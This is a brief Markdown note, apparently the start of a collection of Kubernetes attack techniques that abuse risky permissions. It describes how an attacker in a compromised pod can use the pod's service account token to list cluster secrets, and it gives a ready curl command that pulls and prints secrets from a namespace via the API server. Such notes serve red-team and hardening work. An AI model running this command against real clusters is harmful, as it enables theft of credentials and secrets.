# Kubernetes

Collection of Kubernetes Attack vectors based on risky permissions

## Listing secrets

If a attacker is able to overtake a pod he has access to the service accounts JWT that the pod uses to talk to the api server. If the token is privilided to read secretes, the following curl call can be used to get the secretes.
````
curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://<controlpane-ip>:6443/api/v1/namespaces/cloud-idp/secrets | jq  -r ".items[].data"
````
